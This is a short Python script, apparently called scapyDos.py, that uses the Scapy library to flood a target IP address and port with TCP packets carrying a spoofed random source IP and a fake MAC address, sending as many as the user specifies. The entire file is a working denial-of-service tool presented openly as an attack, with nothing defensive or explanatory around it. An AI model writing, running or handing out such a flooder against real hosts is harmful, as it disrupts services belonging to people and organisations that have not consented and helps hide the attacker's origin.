from scapy.all import Ether
from scapy.all import *
import sys,os

if (len(sys.argv) < 4):
    print("Use me like this: python scapyDos.py $Destination_IP $Destination_Port $COUNTER")
    quit()

def attack(d_ip,d_port,c):
    s_ip = RandIP()
    s_mac = "aa:bb:cc:dd:ee:ff"
    pkt = (Ether(src=s_mac)/IP(src=s_ip,dst=d_ip)/TCP(sport=1234,dport=int(d_port)))
    sendp(pkt,count=int(c))
    
attack(sys.argv[1],sys.argv[2],sys.argv[3])
